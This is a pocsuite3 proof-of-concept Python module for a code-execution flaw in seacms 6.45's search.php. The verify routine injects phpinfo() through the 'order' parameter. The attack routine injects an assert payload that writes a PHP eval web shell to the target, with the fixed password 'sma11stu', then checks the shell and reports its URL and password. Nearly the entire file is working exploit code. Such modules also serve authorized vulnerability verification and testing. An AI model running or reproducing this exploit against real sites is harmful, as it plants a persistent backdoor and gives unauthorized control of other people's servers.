# encoding: utf-8
# Author    : Sma11stu
# Datetime  : 2021/3/13 10:15
# Product   : PyCharm
# Project   : pocsuite3
# File      : seacms_6_45_rce.py
# explain   : 文件说明
"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""

import re
import time
from collections import OrderedDict
from urllib.parse import urljoin
from base64 import b64encode
from pocsuite3.api import CEye
from requests.cookies import RequestsCookieJar
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, POC_CATEGORY, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text,random_str
from pocsuite3.lib.core.interpreter_option import OptString

class DemoPOC(POCBase):
    vulID = 'xxx'  # ssvid
    version = '3.0'
    author = ['seebug']
    vulDate = '2021-03-13'
    createDate = '2021-03-13'
    updateDate = '2021-03-13'
    references = ['https://github.com/jiangsir404/PHP-code-audit/blob/master/seacms/seacms%20%E5%A4%9A%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93(search.php).md']
    name = 'seacms 6.45 代码执行漏洞'
    appPowerLink = ''
    appName = 'seacms'
    appVersion = '< 6.45'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''
        seacms 6.45 代码执行漏洞
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        o["username"] = OptString('', description='这个poc需要用户登录，请输入登录账号', require=False)
        o["command"] = OptString('', description='将要执行的系统命令', require=False)
        return o

    def _verify(self):
        result = {}
        phpcode = "phpinfo()"
        flagText = "allow_url_include"
        verify_payload = "searchword=1&searchtype=5&order=}{end if}{if:1)" + phpcode + ";if(1}{end if}"
        veri_url = urljoin(self.url, '/search.php')
        headers = {
            "Content-Type": "application/x-www-form-urlencoded;charset=utf-8",
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        }
        try:
            resp = requests.post(veri_url,data=verify_payload,headers=headers)
            if flagText in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = veri_url
                result['VerifyInfo']['Payload'] = verify_payload
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def _attack(self):
        result = {}
        random_string = random_str(16)
        verify_payload = "searchword=1&searchtype=5&order=}{end if}{if:1)$_POST[func]($_POST[cmd]);if(1}{end if}&cmd=fwrite(fopen('" + random_string + ".php','w'),'<?php @eval($_POST[sma11stu]);?>" + random_string + "')&func=assert"
        veri_url = urljoin(self.url, '/search.php')
        shell_url = urljoin(self.url, '/' + random_string + '.php')
        headers = {
            "Content-Type": "application/x-www-form-urlencoded;charset=utf-8",
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        }
        try:
            resp = requests.post(veri_url,data=verify_payload,headers=headers)
            time.sleep(1)
            resp_1 = requests.get(shell_url,headers=headers)
            if (random_string in resp_1.text) and resp_1.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = veri_url
                result['VerifyInfo']['Payload'] = verify_payload
                result['VerifyInfo']['Shell_url'] = urljoin(self.url, '/' + random_string + '.php')
                result['VerifyInfo']['Shell_pass'] = "sma11stu"
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def _shell(self):
        return self._attack()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
